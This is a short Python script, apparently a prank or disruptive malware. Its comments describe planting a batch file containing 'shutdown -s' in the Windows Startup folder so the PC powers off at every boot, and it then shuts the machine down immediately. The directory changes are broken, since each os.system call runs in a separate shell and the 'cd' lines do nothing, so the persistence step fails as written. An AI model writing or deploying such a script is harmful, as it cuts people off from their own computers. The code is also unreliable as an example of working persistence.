import os

# accessing the folder where the startup programs are

os.system("cd %appdata%")
os.system("cd Microsoft")
os.system("cd Windows")
os.system("cd Start Menu")
os.system("cd Programs")
os.system("cd Startup")

# creating the BATCH file and shutting the PC down

os.system("echo shutdown -s > script.bat")
os.system("shutdown -s")